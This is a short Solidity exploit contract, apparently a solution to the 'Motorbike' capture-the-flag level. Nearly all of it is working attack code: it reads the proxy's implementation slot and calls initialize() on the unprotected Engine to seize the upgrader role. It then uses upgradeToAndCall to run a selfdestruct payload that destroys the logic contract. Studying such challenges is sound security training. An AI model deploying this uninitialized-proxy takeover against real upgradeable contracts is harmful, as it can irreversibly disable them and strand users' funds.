// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import "../../src/Motorbike/Motorbike.sol";

interface IEngine {
    function initialize() external;
    function upgradeToAndCall(address newImplementation, bytes calldata data) external payable;
}

contract MaliciousContract {
    function explode() public {
        selfdestruct(msg.sender);
    }
}

contract MotorbikeExploit {

    Motorbike motorbike;
    MaliciousContract malicious;

    constructor(address payable _victim) public {
        motorbike = Motorbike(_victim);
        malicious = new MaliciousContract();
    }

    function hack() public {
        // Get the implementation (Engine) address from the storage slot of the Motorbike proxy
        bytes32 IMPLEMENTATION_SLOT = 0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc;
        address engineAddress;
        assembly {
            engineAddress := sload(IMPLEMENTATION_SLOT)
        }

        // Cast the Engine address to the IEngine interface
        IEngine engine = IEngine(engineAddress);

        // Call initialize() on the Engine to set ourselves as the upgrader
        engine.initialize();

        // Prepare data to call the explode() function
        bytes memory data = abi.encodeWithSignature("explode()");

        // Call upgradeToAndCall() on the Engine, pointing to our malicious contract
        engine.upgradeToAndCall(address(malicious), data);
    }
}